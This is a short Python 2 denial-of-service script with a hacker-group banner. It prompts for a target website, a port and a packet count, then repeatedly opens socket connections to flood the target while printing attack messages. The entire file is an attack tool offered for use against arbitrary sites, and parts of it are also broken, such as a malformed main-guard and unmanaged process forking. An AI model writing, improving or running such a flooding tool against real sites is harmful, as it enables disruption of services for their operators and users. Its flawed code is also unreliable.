#!/usr/bin/python
# -*- coding: utf-8 -*-
#Script By TsNt1x
#With CL4$H0V3RDR1V3
import socket
import time
import os
import sys
import string

print ('''
██╗    ██╗███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███
██║    ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██║ █╗ ██║█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║
██║███╗██║██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
╚███╔███╔╝███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝


 ###################                   +---------------------+
 # C0D3D By TsNt1x #    <--------->    | With CL4$H0V3RDR1V3 |
 ###################                   +---------------------+
     ''')

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
message = "WedTEAM"
print (" ")
host=raw_input( "ENTER THE SITE FOR DDOS :" )
print (" ")
port=input( "ENTER THE DOOR FOR THE ATTACK :" )
print (" ")
conn=input( "HOW MANY PACKETS DO YOU WANT TO SEND ? :" )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[ATTACKING ===> " + host + "]" )
def dos():
    pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[NO CONNECTION|")
    print ( "@===]=====> DDoS <=====[===@")
    ddos.close()
for i in range(1, conn):
    dos()
print("CONCLUDED")
if _name_ == "_main_":
    answer = raw_input("WANT MORE DDoS ? :")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
